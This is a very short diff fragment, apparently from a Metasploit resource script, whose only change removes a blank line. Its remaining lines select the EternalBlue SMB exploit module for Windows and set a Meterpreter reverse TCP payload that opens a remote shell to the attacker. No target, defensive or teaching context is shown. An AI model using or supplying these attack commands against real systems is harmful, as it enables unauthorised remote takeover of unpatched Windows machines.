@@ -1,3 +1,2 @@
 use exploit/windows/smb/ms17_010_eternalblue
 set PAYLOAD windows/x64/meterpreter/reverse_tcp
-
